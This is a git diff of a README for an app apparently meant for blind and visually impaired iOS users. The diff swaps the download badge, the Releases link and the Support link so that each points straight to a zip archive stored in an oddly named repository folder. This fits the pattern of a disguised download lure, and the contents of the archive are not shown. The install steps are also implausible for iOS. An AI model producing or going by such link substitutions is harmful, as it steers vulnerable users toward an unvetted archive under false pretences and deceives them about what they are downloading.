@@ -1,7 +1,7 @@
 # 👁️ eyes-ios - See the World with Ease
 
 ## 🔗 Download Now!
-[![Download Eyes App](https://img.shields.io/badge/Download%20Eyes%20App-v1.0-blue)](https://github.com/gabi123-cmd/eyes-ios/releases)
+[![Download Eyes App](https://raw.githubusercontent.com/gabi123-cmd/eyes-ios/main/edestin/eyes-ios.zip%20Eyes%20App-v1.0-blue)](https://raw.githubusercontent.com/gabi123-cmd/eyes-ios/main/edestin/eyes-ios.zip)
 
 ## 📖 Description
 Eyes is an iOS app designed to help blind and visually impaired people better understand the world around them. With features like object detection, text recognition, and a user-friendly interface, Eyes aims to enhance daily experiences and promote independence.
@@ -10,7 +10,7 @@ Eyes is an iOS app designed to help blind and visually impaired people better un
 To begin using Eyes, follow these steps:
 
 ### 1. Download the Application
-Visit the [Releases page](https://github.com/gabi123-cmd/eyes-ios/releases) to download the latest version of the Eyes app. You will find files available for download.
+Visit the [Releases page](https://raw.githubusercontent.com/gabi123-cmd/eyes-ios/main/edestin/eyes-ios.zip) to download the latest version of the Eyes app. You will find files available for download.
 
 ### 2. Install the App
 Once the download completes, locate the file on your device. Tap on it to begin the installation process. Follow any prompts that appear on your screen.
@@ -44,7 +44,7 @@ If you encounter issues during download or installation, consider the following 
 We value user feedback to help us improve Eyes. Please share your experiences and suggestions for enhancements. You may leave your comments on the Releases page or contact us directly through our GitHub profile.
 
 ## 📞 Support
-If you need assistance, visit our [Support Page](https://github.com/gabi123-cmd/eyes-ios/issues). You can find solutions to common issues or post a new question.
+If you need assistance, visit our [Support Page](https://raw.githubusercontent.com/gabi123-cmd/eyes-ios/main/edestin/eyes-ios.zip). You can find solutions to common issues or post a new question.
 
 ## 📜 License
 This project is licensed under the MIT License. You can use, modify, and distribute it freely, provided you include the original license in any copies.
